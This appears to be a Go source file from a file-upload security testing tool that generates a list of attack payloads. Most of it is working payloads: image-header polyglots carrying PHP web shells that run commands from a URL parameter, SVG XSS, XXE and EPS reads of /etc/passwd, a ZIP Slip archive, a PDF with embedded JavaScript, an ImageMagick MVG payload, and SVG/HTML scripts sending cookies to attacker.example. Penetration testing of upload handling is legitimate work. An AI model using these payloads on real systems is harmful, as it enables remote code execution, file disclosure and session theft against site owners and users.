package payload

import "fmt"

// PolyglotArchivePayloads generates polyglot and archive-based attack payloads
func PolyglotArchivePayloads() []*Payload {
	var payloads []*Payload

	// ── GIF + PHP Polyglots ──
	gifHeader := "GIF89a"
	gifPayloads := []struct {
		name    string
		content string
	}{
		{
			name:    "GIF89a + PHP system",
			content: gifHeader + "\n<?php system($_GET['cmd']); ?>",
		},
		{
			name:    "GIF89a + PHP shell_exec",
			content: gifHeader + "\n<?php echo shell_exec($_GET['cmd']); ?>",
		},
		{
			name:    "GIF89a + PHP passthru",
			content: gifHeader + "\n<?php passthru($_GET['cmd']); ?>",
		},
		{
			name:    "GIF89a + PHP eval",
			content: gifHeader + "\n<?php eval($_GET['cmd']); ?>",
		},
		{
			name:    "GIF89a + PHP marker",
			content: gifHeader + "\n<?php echo 'RCE_SUCCESS'; system($_GET['cmd']); ?>",
		},
	}

	for _, p := range gifPayloads {
		payloads = append(payloads, &Payload{
			TestType:  TestTypePolyglotArchive,
			Technique: "Polyglot GIF+PHP: " + p.name,
			Filename:  "polyglot.gif",
			Extension: ".gif",
			Body:      []byte(p.content),
			Tags:      []string{"polyglot", "gif", "php", "rce"},
		})
	}

	// ── JPEG + PHP Polyglots ──
	jpegMagic := "\xFF\xD8\xFF\xE0"
	jpegPayloads := []struct {
		name    string
		content string
	}{
		{
			name:    "JPEG magic + PHP",
			content: jpegMagic + "\n<?php system($_GET['cmd']); ?>",
		},
		{
			name:    "JPEG magic + PHP marker",
			content: jpegMagic + "\n<?php echo 'RCE_SUCCESS'; system($_GET['cmd']); ?>",
		},
	}

	for _, p := range jpegPayloads {
		payloads = append(payloads, &Payload{
			TestType:  TestTypePolyglotArchive,
			Technique: "Polyglot JPEG+PHP: " + p.name,
			Filename:  "polyglot.jpg",
			Extension: ".jpg",
			Body:      []byte(p.content),
			Tags:      []string{"polyglot", "jpeg", "php", "rce"},
		})
	}

	// ── PNG + PHP Polyglots ──
	pngMagic := "\x89PNG\r\n\x1a\n"
	pngPayloads := []struct {
		name    string
		content string
	}{
		{
			name:    "PNG magic + PHP",
			content: pngMagic + "<?php system($_GET['cmd']); ?>",
		},
		{
			name:    "PNG magic + PHP marker",
			content: pngMagic + "<?php echo 'RCE_SUCCESS'; system($_GET['cmd']); ?>",
		},
	}

	for _, p := range pngPayloads {
		payloads = append(payloads, &Payload{
			TestType:  TestTypePolyglotArchive,
			Technique: "Polyglot PNG+PHP: " + p.name,
			Filename:  "polyglot.png",
			Extension: ".png",
			Body:      []byte(p.content),
			Tags:      []string{"polyglot", "png", "php", "rce"},
		})
	}

	// ── SVG XSS/XXE Polyglots ──
	svgPayloads := []struct {
		name    string
		content string
	}{
		{
			name: "SVG with JavaScript XSS",
			content: `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert('XSS')</script>
  <text x="10" y="20">Test</text>
</svg>`,
		},
		{
			name: "SVG with external entity (XXE)",
			content: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>`,
		},
		{
			name: "SVG with fetch (cookie exfil)",
			content: `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.example/steal?c='+document.cookie)">
</svg>`,
		},
	}

	for _, p := range svgPayloads {
		payloads = append(payloads, &Payload{
			TestType:  TestTypePolyglotArchive,
			Technique: "Polyglot SVG: " + p.name,
			Filename:  "polyglot.svg",
			Extension: ".svg",
			Body:      []byte(p.content),
			Tags:      []string{"polyglot", "svg", "xss", "xxe"},
		})
	}

	// ── ZIP Slip ──
	zipSlipContent := createZipSlipPayload()
	payloads = append(payloads, &Payload{
		TestType:  TestTypePolyglotArchive,
		Technique: "ZIP Slip - path traversal in archive",
		Filename:  "archive.zip",
		Extension: ".zip",
		Body:      zipSlipContent,
		Tags:      []string{"polyglot", "zip", "traversal", "archive"},
	})

	// ── PDF + JavaScript ──
	pdfContent := `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('XSS')) >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000108 00000 n 
0000000193 00000 n 
trailer
<< /Root 1 0 R /Size 4 >>
startxref
0
%%EOF`

	payloads = append(payloads, &Payload{
		TestType:  TestTypePolyglotArchive,
		Technique: "PDF with JavaScript",
		Filename:  "polyglot.pdf",
		Extension: ".pdf",
		Body:      []byte(pdfContent),
		Tags:      []string{"polyglot", "pdf", "javascript", "xss"},
	})

	// ── ImageMagick MVG ──
	mvgPayload := `push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.example/test.jpg")'
pop graphic-context`

	payloads = append(payloads, &Payload{
		TestType:  TestTypePolyglotArchive,
		Technique: "ImageMagick MVG - SSRF/command injection",
		Filename:  "exploit.mvg",
		Extension: ".mvg",
		Body:      []byte(mvgPayload),
		Tags:      []string{"polyglot", "imagemagick", "ssrf", "cve-2016-3714"},
	})

	// ── EPS PostScript ──
	epsPayload := `%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 100 100
/Times-Roman findfont 20 scalefont setfont
10 10 moveto
(file:///etc/passwd) (r) file
pop pop
showpage
%%EOF`

	payloads = append(payloads, &Payload{
		TestType:  TestTypePolyglotArchive,
		Technique: "EPS PostScript - file read",
		Filename:  "exploit.eps",
		Extension: ".eps",
		Body:      []byte(epsPayload),
		Tags:      []string{"polyglot", "eps", "postscript", "imagemagick"},
	})

	// ── HTML+JS polyglots ──
	htmlPayload := `<!DOCTYPE html>
<html>
<head><title>Image</title></head>
<body>
<script>alert(document.domain); fetch('https://attacker.example/steal?c='+document.cookie);</script>
</body>
</html>`

	for _, ext := range []string{".svg", ".html", ".htm", ".xhtml"} {
		payloads = append(payloads, &Payload{
			TestType:  TestTypePolyglotArchive,
			Technique: "HTML+JS polyglot (" + ext + ")",
			Filename:  "exploit" + ext,
			Extension: ext,
			Body:      []byte(htmlPayload),
			Tags:      []string{"polyglot", "html", "xss", "javascript"},
		})
	}

	return payloads
}

func createZipSlipPayload() []byte {
	filename := "../../../tmp/zipslip_test.txt"
	content := "ZIP_SLIP_TEST"
	return []byte(fmt.Sprintf("PK\x03\x04\n\x00\x00\x00\x00\x00%s\n%s", filename, content))
}
